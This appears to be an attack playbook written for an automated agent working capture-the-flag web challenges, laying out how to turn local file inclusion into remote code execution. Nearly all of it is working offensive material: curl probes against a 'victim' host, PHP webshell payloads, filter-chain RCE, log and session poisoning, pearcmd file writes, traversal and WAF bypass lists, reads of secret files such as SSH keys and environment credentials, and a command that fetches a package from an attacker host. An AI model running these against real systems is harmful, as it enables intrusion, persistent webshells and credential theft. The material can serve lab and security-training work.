# LFI → RCE

Modern LFI is rarely just "read `/etc/passwd`". The chain you want is: **detect the sink → disclose source via filter → pick a write-primitive that turns `include`/`require` into code execution**. Since 2022, PHP filter chains ([synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)) made this universal — any `include($_GET['file'])` of a user-readable path is RCE, even with `allow_url_include=Off`, no log poisoning, no upload. Start shell-first: three `curl` probes tell you which layer of the chain is gated.

## Layer 0 — Detect the sink and language

Spot vulnerable parameter names first:
```
file, page, template, include, view, doc, path, name, inc, lang, locale,
module, action, content, layout, src, theme, folder, root, skin, style
```

Source grep patterns if you have code:
```bash
# PHP
grep -rnE 'include(_once)?|require(_once)?|file_get_contents|readfile|fopen|show_source|highlight_file|virtual' .
# Python
grep -rnE 'open\(|send_file\(|render_template\(|jinja2\.Template\(|pathlib.*read_text|os\.path\.join.*request' .
# Node
grep -rnE 'fs\.(read|createRead)|require\([^\"\']|sendFile|res\.sendFile|path\.join.*req\.' .
# Java / JSP
grep -rnE 'new File\(|FileInputStream|RequestDispatcher.*include|getResourceAsStream|Paths\.get' .
# Ruby
grep -rnE 'File\.(open|read)|IO\.read|send_file|render\s+file:' .
```

Shape of a vulnerable sink:
```php
<?php include($_GET['page'] . '.php'); ?>      // strip suffix with %00 (<5.3) or filter chain
<?php require_once($_REQUEST['file']); ?>      // no suffix; easiest target
<?php readfile("./templates/" . $_GET['t']); ?>// path-joined; traversal only
```

```python
# Flask
return send_file(f"/app/templates/{request.args['name']}")   # traversal
return open(request.args['file']).read()                     # open-arbitrary
```

Fingerprint the stack first — it decides which primitives apply:
```bash
curl -sI https://victim/ | grep -iE 'server|x-powered-by'
curl -s https://victim/nonexistent.x | grep -iE 'php|apache|nginx|werkzeug|express|tomcat'
```

## Layer 1 — Read first (confirm LFI, enumerate paths)

One-liner probe. Vary traversal depth until content changes:
```bash
TARGET='https://victim/index.php?file='
for n in 1 2 3 4 5 6 7 8; do
  d=$(printf '../%.0s' $(seq 1 $n))
  printf '%-40s ' "depth=$n"
  curl -s "${TARGET}${d}etc/passwd" | head -1
done
```

First hit with `root:x:0:0:` → you're in. Absolute paths work too if no prefix is concatenated:
```bash
curl -s "${TARGET}/etc/passwd"
```

Priority reads once LFI confirmed:
```
/etc/passwd                               # user enum
/etc/hosts                                # internal DNS names
/etc/hostname                             # container hint
/etc/shadow                               # only if web user is root (rare)
/proc/self/cmdline                        # running process + args
/proc/self/environ                        # env vars (DB creds, secrets)
/proc/self/cwd/                           # symlink — where the app runs
/proc/self/exe                            # interpreter binary
/proc/self/maps                           # memory layout
/proc/self/fd/0  /proc/self/fd/1  ...     # open FDs → log files, sockets
/proc/<pid>/cmdline                       # other processes (enumerate PIDs)
/proc/mounts /proc/version /proc/cpuinfo  # environment fingerprint
/var/www/html/index.php                   # app source (prefix guess)
/var/www/html/config.php
/app/.env  /app/config.yml  /app/.git/config
/home/*/.bash_history /home/*/.ssh/id_rsa
/root/.bash_history /root/.ssh/id_rsa
/etc/nginx/nginx.conf  /etc/nginx/sites-enabled/*
/etc/apache2/apache2.conf  /etc/apache2/sites-enabled/000-default.conf
/etc/php/*/fpm/php.ini  /etc/php/*/cli/php.ini
/var/log/apache2/access.log  /var/log/nginx/access.log
/var/log/auth.log  /var/log/vsftpd.log  /var/log/mail.log
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/opt/app/.env  /srv/*/config.*
wp-config.php  wp-content/debug.log
.htaccess  .htpasswd
```

Windows targets:
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\<user>\NTUSER.DAT
```

Enumerate PHP/app source. Paths differ; don't guess — read `/proc/self/cmdline` and `/proc/self/environ` first to anchor yourself:
```bash
curl -s "${TARGET}/proc/self/cmdline" | tr -d '\0' ; echo
curl -s "${TARGET}/proc/self/environ" | tr '\0' '\n'
```

## Layer 2 — PHP specific (the hot path)

### PHP wrappers

```bash
# Source-code disclosure — base64 survives binary-safe transport
curl -s "${TARGET}php://filter/convert.base64-encode/resource=index.php" | base64 -d
curl -s "${TARGET}php://filter/convert.base64-encode/resource=../config/database.php" | base64 -d

# Quick obfuscation bypass (naïve "<?php" blacklists)
curl -s "${TARGET}php://filter/read=string.rot13/resource=index.php"

# Direct RCE if allow_url_include=On  (usually Off in 2026)
curl -s --data-urlencode "cmd=id" "${TARGET}php://input" \
  --data-urlencode '<?php system($_GET[\"cmd\"]); ?>'
curl -s "${TARGET}data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
curl -s "${TARGET}data://text/plain,<?php+system('id');+?>"

# Pack payload into a ZIP → include a file inside it
printf '<?php system($_GET["c"]); ?>' > s.php && zip p.zip s.php
# upload p.zip somewhere included/accessible; then:
curl -s "${TARGET}zip:///tmp/uploads/p.zip%23s.php&c=id"
curl -s "${TARGET}zip://./avatar.zip%23shell.php&c=id"

# phar:// triggers deserialize on metadata — cross-ref deserialization skill
curl -s "${TARGET}phar:///tmp/avatar.phar/nothing.txt"

# expect:// — direct RCE if the expect extension is loaded (rare)
curl -s "${TARGET}expect://id"
```

Reference table:
| Wrapper | Purpose | Gated by |
|---|---|---|
| `php://filter/convert.base64-encode/resource=X` | read source (binary-safe) | nothing |
| `php://filter/read=string.rot13/resource=X` | obfuscate | nothing |
| `php://input` | POST body → code | `allow_url_include=On` |
| `data://text/plain,<?php ?>` | inline RCE | `allow_url_include=On` |
| `zip://path.zip#inner.php` | RCE from uploaded ZIP | file upload reachable |
| `phar://path.phar/x` | unserialize RCE chain | phar parser pre-8.0 (or allowed) |
| `expect://cmd` | direct RCE | expect ext loaded |
| `glob://*.php` | wildcard listing | nothing (read-only) |

### PHP filter chain RCE — the 2022+ gem

Synacktiv showed that chaining `convert.iconv.*` filters can synthesize **arbitrary bytes** inside the filter composition itself. You feed the include ANY file the web user can read (e.g., `/etc/passwd`), and the resulting bytes prepended by the chain form valid PHP which `include` then executes. Works with `allow_url_include=Off`.

How it works in one sentence: each `convert.iconv.UTF8.CSISO2022KR` step introduces a predictable prefix byte; pair a base64-encode with a base64-decode later, and you can walk base64's arithmetic to produce any target byte — one chain hop per base64 char of your payload (~6 bits of signal). The final decoded stream is your PHP source.

Generate and fire:
```bash
# One-shot clone + generate
git clone https://github.com/synacktiv/php_filter_chain_generator /tmp/pfcg
python3 /tmp/pfcg/php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
#         ...many hops.../resource=php://temp

# Plug into the LFI; resource= points to ANY readable file
CHAIN='php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=/etc/passwd'
curl -sG "${TARGET%file=}" --data-urlencode "file=${CHAIN}" --data-urlencode '0=id'
```

Common chain payloads (substitute any one-liner into `--chain`):
```bash
# Command-exec shell via GET[0] (backtick executes in PHP)
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'

# assert() shell — alias for arbitrary code execution in PHP <= 7.1; still present everywhere
python3 php_filter_chain_generator.py --chain '<?php assert($_POST[0]);?>'

# Drop a persistent webshell
python3 php_filter_chain_generator.py \
  --chain '<?php file_put_contents("/tmp/s.php","<?php system(\$_GET[0]);?>");?>'
```

URL length trap: chains are ~3-10 KB. Server limits on URL length can truncate — switch to a POST-body LFI if available, or chunk to a shorter payload (`<?=$_GET[0]?>` is tiny but requires `register_globals`-ish setup). Use `--with-raw-payload` only if your include output is inspected pre-eval.

Local verification before firing at the target:
```bash
apt-get install -y php-cli >/dev/null
echo '<?php include($_GET["f"]); ?>' > /tmp/lfi.php
php -S 127.0.0.1:9999 -t /tmp >/dev/null &
curl -sG 'http://127.0.0.1:9999/lfi.php' --data-urlencode "f=${CHAIN}" --data-urlencode '0=id'
```

Citations:
- [Synacktiv — PHP filters chain: what is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
- [Synacktiv — PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle)
- [github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- [github.com/synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) — blind-read via error oracle

### Log poisoning

Write PHP into a log the include will later parse. Works when `allow_url_include=Off` AND no filter chain (pre-2022 targets or filtered `php://`).

```bash
# Apache access.log / error.log
curl -s 'https://victim/' -H 'User-Agent: <?php system($_GET["c"]); ?>'
curl -s "${TARGET}/var/log/apache2/access.log&c=id"
curl -s "${TARGET}/var/log/apache2/error.log&c=id"

# Nginx (default paths)
curl -s 'https://victim/' -H 'User-Agent: <?php system($_GET["c"]); ?>'
curl -s "${TARGET}/var/log/nginx/access.log&c=id"

# SSH auth.log — username becomes log line
ssh '<?php system($_GET["c"]); ?>'@victim           # quoting matters
curl -s "${TARGET}/var/log/auth.log&c=id"

# Mail log — email local part
echo x | mail -s x '<?php system($_GET["c"]); ?>@victim'
curl -s "${TARGET}/var/log/mail.log&c=id"

# vsftpd
curl ftp://'<?php system($_GET["c"]); ?>':x@victim   # username field
curl -s "${TARGET}/var/log/vsftpd.log&c=id"

# procfs — /proc/self/environ stores USER-AGENT on some CGI setups
curl -s "${TARGET}/proc/self/environ&c=id" -H 'User-Agent: <?php system($_GET["c"]); ?>'

# /proc/self/fd/N — file descriptor points to log
for n in 0 1 2 3 4 5 6 7 8 9 10 11 12; do
  curl -s "${TARGET}/proc/self/fd/$n" | head -1
done
```

Content-Length trap: Apache logs truncate long UA strings. Keep payload <8KB and escape quotes. PHP parser tolerates `<?php` appearing after non-PHP chars, so a dirty log is still exploitable.

### PHP session file LFI → RCE

Two flavors. Both require knowing the session file path (`/var/lib/php/sessions/sess_<PHPSESSID>` or `/tmp/sess_<PHPSESSID>`; check `session.save_path` in `php.ini`).

**Flavor 1 — user-controlled session data**
```bash
# Log in / visit endpoint that stores your input into $_SESSION
curl -c /tmp/c -b /tmp/c 'https://victim/profile' \
  -d 'bio=<?php system($_GET[0]); ?>'
SID=$(grep -oP 'PHPSESSID\s+\K\S+' /tmp/c)
curl -s "${TARGET}/var/lib/php/sessions/sess_${SID}&0=id"
```

**Flavor 2 — session.upload_progress.enabled=On (PHP default since 5.4)**
Race condition: during a multipart upload, PHP stores progress (including your `PHP_SESSION_UPLOAD_PROGRESS` field value) in the session file. Window is the duration of the upload — make it long by posting 10+ MB.
```bash
# Terminal A — slow upload
dd if=/dev/urandom of=/tmp/big bs=1M count=20
curl -b 'PHPSESSID=sniper' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]);?>' \
  -F 'f=@/tmp/big' \
  https://victim/upload.php --limit-rate 100k &

# Terminal B — race the include
while :; do
  curl -s "${TARGET}/var/lib/php/sessions/sess_sniper&0=id" | grep -q uid && break
done
```
Reference: [HackTricks — LFI2RCE via session.upload_progress](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html).

### pearcmd.php LFI → RCE

On many shared-hosting / CTF docker images, `/usr/share/php/pearcmd.php` is present and includable. With `register_argc_argv=On` (PHP default), query-string `+` tokens become `argv` — `pearcmd.php` parses them as CLI args:

```bash
# Write an attacker-controlled PHP file via pear's config-create subcommand
curl -s "${TARGET%%=}=/usr/share/php/pearcmd.php&+config-create+/<?=system(\$_GET[0])?>+/tmp/pwn.php"
# Now include it
curl -s "${TARGET}/tmp/pwn.php&0=id"
```

Alternative via `install` with remote PEAR package (needs outbound HTTP):
```bash
curl -s "${TARGET%%=}=/usr/share/php/pearcmd.php&+install+-f+http://ATTACKER/malicious.tar"
```

Variants: `/usr/local/lib/php/pearcmd.php`, `/usr/share/pear/pearcmd.php`. Grep `/proc/self/environ` for `PEAR_INSTALL_DIR` if lost.

References:
- [Bo0oM/PHP_LFI_rce](https://github.com/Bo0oM/PHP_LFI_rce)
- [Swissky — LFI PayloadsAllTheThings: pearcmd.php](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi-to-rce-via-pearcmdphp)

### /tmp/phpXXXXXX upload race + brute filename

During ANY multipart POST, PHP creates `/tmp/phpXXXXXX` with your upload body until the handler finishes. If you race the LFI during that window, you can include your PHP before PHP unlinks it. Filename is 6 chars from PHP's `[A-Za-z0-9]` pool → 56 billion, but it's often quickly enumerable with `glob://` or by brute during a long POST.

```bash
# Attacker side — keep 100 long uploads in flight
for i in $(seq 1 100); do
  (curl -s https://victim/any.php -F "a=@shell.php" --limit-rate 10k &)
done

# LFI side — glob-hunt the right /tmp file
curl -s "${TARGET}php://filter/convert.base64-encode/resource=glob:///tmp/php*"
# Or fire at many names in parallel (ffuf):
ffuf -u "${TARGET}/tmp/phpFUZZ" -w <(python3 -c "
import itertools,string
for s in itertools.product(string.ascii_letters+string.digits,repeat=6):
  print(''.join(s))") -mc 200 -t 200
```

Reference: [Orange Tsai — phpinfo LFI race](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf).

### Wrapper chaining

Stack filters for WAF evasion or multi-encode:
```bash
# rot13 → base64 → read
curl -s "${TARGET}php://filter/string.rot13|convert.base64-encode/resource=config.php"

# zlib compression survives some WAFs
curl -s "${TARGET}php://filter/zlib.deflate|convert.base64-encode/resource=index.php" \
  | base64 -d | zlib-flate -uncompress

# Data URI inside a filter (rare but funny)
curl -s "${TARGET}php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
```

## Layer 3 — Other languages

### Python (Flask/Django/FastAPI)

Classic sinks: `open(user_input).read()`, `send_file(user_input)`, `jinja2.Environment.get_template`, `importlib.import_module(user_input)`.
```bash
# Flask send_file / send_from_directory (traversal without safe_join)
curl -s "https://victim/download?name=../../../etc/passwd"
curl -s "https://victim/download?name=..%2f..%2fapp%2fconfig.py"

# jinja2.include escaping to RCE: if user controls template name AND a
# templates dir is writable, include + upload SSTI payload. Often chained with SSRF.

# importlib / __import__ — pure RCE if user input reaches it
curl -s "https://victim/load?mod=os"    # inspect error message
```

Python-specific hot files:
```
/proc/self/cmdline         # python3 /app/wsgi.py ...
/app/app.py /app/wsgi.py
/app/.env /app/settings.py /app/config.py
~/.cache/pip   (rare)
/var/log/gunicorn/access.log   (rare LFI→log poison, requires template rendering of user input)
```

### Node.js

Classic sinks: `fs.readFile`, `fs.readFileSync`, `res.sendFile`, `require(user_input)`, `path.join(user_input)`.
```bash
# sendFile traversal (express <4.18 without root option)
curl -s "https://victim/file?p=../../../etc/passwd"

# require() user input → RCE via npm package or a relative file
curl -s "https://victim/plugin?name=../../../../tmp/shell"   # loads /tmp/shell.js

# path.join bypass on Windows
curl -s "https://victim/f?p=..\\..\\..\\windows\\win.ini"
```

If you find `require(userInput)` you already have RCE — upload a `.js` then require it. If only `fs.readFile`, you read source (grep for secrets, JWT keys, DB strings).

Node hot files:
```
package.json            # script names, dependencies
.env
ecosystem.config.js     # pm2 config
/proc/self/cmdline
```

### Ruby (Rails / Sinatra)

```bash
# send_file traversal
curl -s "https://victim/download?f=../../../etc/passwd"

# render file: user_input → RCE via ERB template upload
curl -s "https://victim/preview?template=/tmp/evil.erb"
```

Secrets to hunt:
```
config/database.yml
config/master.key  config/credentials.yml.enc
Gemfile.lock
```

### Java / JSP / Servlet

```bash
# Servlet path traversal
curl -s "https://victim/file?name=..%2f..%2fWEB-INF%2fweb.xml"
curl -s "https://victim/file?name=..%2f..%2fWEB-INF%2fclasses%2fapplication.properties"

# Spring Boot actuator leak (not LFI proper but often adjacent)
curl -s "https://victim/actuator/env"
```

Java tomcat targets:
```
WEB-INF/web.xml             # servlet mapping
WEB-INF/classes/*.class     # bytecode → decompile
WEB-INF/lib/*.jar
/usr/local/tomcat/conf/tomcat-users.xml
/proc/self/cmdline          # -Dspring.config.location= ...
```

## Layer 4 — Bypasses

### Path traversal tricks

| Bypass | Example | Beats |
|---|---|---|
| URL-encoded dots/slashes | `..%2f..%2f..%2fetc%2fpasswd` | naïve string filter |
| Double URL encoding | `%252e%252e%252f` | WAF decodes once, app decodes twice |
| Strip-once `../` replacement | `....//....//....//etc/passwd` | `str_replace("../","",...)` |
| Backslash (Windows) | `..\\..\\..\\windows\\win.ini` | Unix blacklists only `/` |
| Unicode dot | `%c0%ae%c0%ae/` | mod_security ≤ 2.4 |
| Unicode U+FF0E | `\uff0e\uff0e/`, `..%ef%bc%8e/` | over-normalization |
| Semi-colon path | `..;/..;/..;/etc/passwd` | Tomcat, some NGINX |
| Nullbyte | `?file=../../../etc/passwd%00` | PHP < 5.3.4 with suffix concat |
| Question in path | `?file=../../etc/passwd?` | truncates appended suffix |
| Overlong UTF-8 | `%e0%80%ae` → `.` | old filters |
| Whitespace | `?file=%20../../etc/passwd` | trim-then-check |
| Absolute path | `?file=/etc/passwd` | when app only strips `../` |
| Alt separators | `..\x2f..\x2f` | path.join differential |
| `.` vs `%2e` mix | `.%2e/.%2e/etc/passwd` | ModSecurity rule 930120 |
| Self-reference | `./././etc/passwd` | regex anchored on `../` only |

Quick loop to fuzz bypass classes:
```bash
TARGET='https://victim/index.php?file='
PAYLOADS=(
  '../../../etc/passwd'
  '..%2f..%2f..%2fetc%2fpasswd'
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
  '....//....//....//etc/passwd'
  '..%252f..%252f..%252fetc%252fpasswd'
  '/etc/passwd'
  '../../../etc/passwd%00'
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
  '..\\..\\..\\etc\\passwd'
  '..;/..;/..;/etc/passwd'
)
for p in "${PAYLOADS[@]}"; do
  printf '%-55s ' "$p"
  curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' \
    "${TARGET}$(jq -rn --arg v "$p" '$v|@uri')"
done
```
Compare sizes — a 3-4× size jump usually means `/etc/passwd` rendered back.

### Suffix stripping (`.php` appended)

```
?file=../../../etc/passwd%00        # nullbyte (PHP < 5.3.4)
?file=../../../etc/passwd#          # fragment truncation (some parsers)
?file=../../../etc/passwd?          # query-string-in-path
?file=php://filter/.../resource=../../../etc/passwd   # wrapper ignores suffix
```

Wrappers generally ignore appended suffixes because they don't exist on disk — filter chains work even when the code is `include($_GET['f'].'.php')`.

### WAF evasion

- Mix case: `PHP://FILTER/...` — some WAFs match lowercase only
- Swap protocol: `PhP://Filter/convert.BASE64-encode/...`
- Insert junk filters: `convert.iconv.UTF8.UTF8|convert.base64-encode` — no-op iconv pair still valid
- POST instead of GET (WAF often weaker on bodies)
- Use `Expect: 100-continue` chunked requests
- Split into `file=php://filter/&chain=...` if app concatenates params

### Blind LFI

Read via oracle when the response body is hidden:

```bash
# Error-based: invalid file throws, valid one returns clean 200 (different size)
for f in /etc/passwd /etc/hosts /nope; do
  printf '%-20s ' "$f"
  curl -s -o /dev/null -w '%{size_download} %{http_code}\n' "${TARGET}${f}"
done

# Filter-chain error oracle (synacktiv blind read)
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit /tmp/pfcoe
python3 /tmp/pfcoe/filters_chain_oracle_exploit.py --target ${TARGET%=} \
  --file /etc/passwd --parameter file

# Timing-based: heavy conversion chain delays response on valid file
# (wrap base64 20× to amplify CPU)

# Out-of-band (if OS-command-exec is eventual goal): data:// + DNS callback in chain
```

### Passing PHP through to the include

Some apps validate the path against a whitelist (`['home','about','contact']`). Common bypasses:
```
?file=home/../../../etc/passwd         # start with allowed prefix
?file=home%2f..%2f..%2fetc%2fpasswd
?file=home..php/../../etc/passwd       # allowed substring anywhere
```

## SSRF-adjacency & chaining

- `phar://` triggers PHP unserialize — if an `include`/`file_exists`/`is_file`/`fopen` touches a phar, metadata deserializes. Cross-ref the **deserialization** skill. Stage an attacker-controlled phar via an image upload (JPEG magic bytes + phar metadata survive most checks).
- `zip://` lets you smuggle PHP source through ZIP uploads that pass MIME checks.
- LFI + SSRF: read `/proc/self/environ`, grab AWS creds from env, pivot. Or read `~/.aws/credentials`.

## Tools in Hydra image

- **curl** — primary workhorse; try this FIRST on every target.
- **ffuf** — parameter discovery + path fuzzing:
  ```bash
  # Find the LFI parameter
  ffuf -u 'https://victim/?FUZZ=../../../etc/passwd' \
       -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
       -fs <baseline-size>
  # Fuzz traversal depth + target file
  ffuf -u "${TARGET}FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200
  ```
- **python3** — for filter-chain generation, race-condition scripting, playwright-driven LFI in auth'd flows.
- **Playwright** (pre-installed) — for JS-heavy challenges where the LFI is behind a login flow.
- **apt install php-cli** — install on demand if you want to locally verify a filter-chain payload end-to-end before firing at the target.

Wordlists in `/usr/share/wordlists/seclists/`:
```
Fuzzing/LFI/LFI-Jhaddix.txt
Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
Discovery/Web-Content/burp-parameter-names.txt
Fuzzing/Windows-Attacks.txt
```

## Not in image (install ad-hoc)

```bash
# Synacktiv PHP filter-chain generator
git clone https://github.com/synacktiv/php_filter_chain_generator /tmp/pfcg
python3 /tmp/pfcg/php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'

# Blind filter-chain exploit (error oracle)
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit /tmp/pfcoe

# Bo0oM's LFI-to-RCE references (pearcmd, procfs, etc.)
git clone https://github.com/Bo0oM/PHP_LFI_rce /tmp/bo0om

# LFISuite (legacy, but handy fallback for classic LFIs)
git clone https://github.com/D35m0nd142/LFISuite /tmp/lfisuite

# kadimus — older blind-LFI scanner
git clone https://github.com/P0cL4bs/Kadimus /tmp/kadimus
```

## LFI → RCE decision tree

```
LFI confirmed (read /etc/passwd)
├── Language = PHP
│   ├── allow_url_include=On          → data://  or  php://input            (1 req)
│   ├── allow_url_include=Off
│   │   ├── php://filter works        → synacktiv filter chain              (universal)
│   │   ├── /usr/share/php/pearcmd.php exists → pearcmd RCE                 (config-create)
│   │   ├── log readable + UA reflects → log poison                         (access/auth/mail)
│   │   ├── session file readable     → session data or upload_progress     (race)
│   │   ├── /tmp/phpXXXXXX brute      → upload race                         (expensive)
│   │   └── phar:// allowed           → deserialize chain (cross-ref)
│   └── include suffixes appended     → wrappers / %00 / ? truncation
├── Language = Python
│   ├── send_file / open → source + env disclosure → hunt secrets
│   ├── render_template(user) + template writable → SSTI
│   └── import_module(user) / __import__(user) → direct RCE
├── Language = Node
│   ├── require(user) → direct RCE (upload .js)
│   └── sendFile / readFile → source + .env
├── Language = Java
│   ├── read WEB-INF/*.class → decompile → hunt secrets
│   └── Spring actuator env leak
└── Language = Ruby
    ├── render file: user → ERB RCE on upload
    └── send_file → source
```

## Stop conditions

- Three bypass classes tried (encoding, wrappers, suffix tricks) and the response size doesn't change from baseline → LFI likely doesn't exist, or sink is filtered at a lower layer. Pivot to another attack class (SSRF, SSTI, SQLi).
- LFI confirms but only specific allow-listed files read → treat as **information disclosure**, hunt for secrets/keys in readable config and keep moving (the flag may literally be in a readable path).
- Filter-chain payload over 10KB and server truncates URL → switch to POST-body LFI, or host a shorter loader and chain via `data://`.
- 30 min with no source disclosure or RCE primitive → write `./work/postmortem.md` with tried paths + response sizes + hypothesis, and pivot.
- Flag read from any file, env var, or post-RCE shell → write `./flag.txt`, emit `FLAG: <flag>`, stop.

## References

- [Synacktiv — PHP filter chains: what is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
- [Synacktiv — PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle)
- [github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- [github.com/synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)
- [Ambionics — phar deserialization research](https://www.ambionics.io/blog/php-phar-deserialization)
- [Bo0oM/PHP_LFI_rce](https://github.com/Bo0oM/PHP_LFI_rce)
- [HackTricks — File Inclusion / Path Traversal](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)
- [HackTricks — LFI2RCE via phpinfo](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)
- [HackTricks — LFI2RCE via Nginx temp files](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files.html)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PortSwigger Web Security Academy — Directory traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger Web Security Academy — File upload (pairs well with phar/zip)](https://portswigger.net/web-security/file-upload)
- [Orange Tsai — phpinfo LFI race](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CTFTime writeups tagged `lfi`](https://ctftime.org/writeups?tags=lfi)
